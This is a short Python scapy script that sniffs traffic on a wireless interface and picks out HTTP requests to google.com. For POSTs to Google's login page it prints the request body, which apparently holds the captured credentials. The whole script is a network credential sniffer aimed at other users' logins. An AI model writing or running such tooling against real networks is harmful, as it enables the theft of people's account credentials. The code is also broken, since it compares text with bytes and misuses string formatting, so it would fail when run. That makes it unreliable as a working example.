from scapy.all import *
import re

conf.iface = "wlp9s0"


def sniffData(pkt):
    if pkt.haslayer(Raw):  # Check for the Data layer
        header = pkt.getlayer(Raw).load  # Get the sent data
        print("header", header)
        methodcheck = header
        # Make sure it's a request
        if methodcheck.startswith(b"GET") or methodcheck.startswith(b"POST"):
            if "google.com" in header:
                src = pkt.getlayer(IP).src
                print("%s visited the malicious the site: %s" % src, "google.com")
                if header.startswith("POST"):
                    if "accounts.google.com/ServiceLogin/" in header:
                        data = header.split("\r\n\r\n")[1]
                        print("[%s] POST data Captured: %s" % src, data)
            else:
                print("Couldnt Capture domain")
        else:
            print("No Method")


sniff(prn=sniffData)
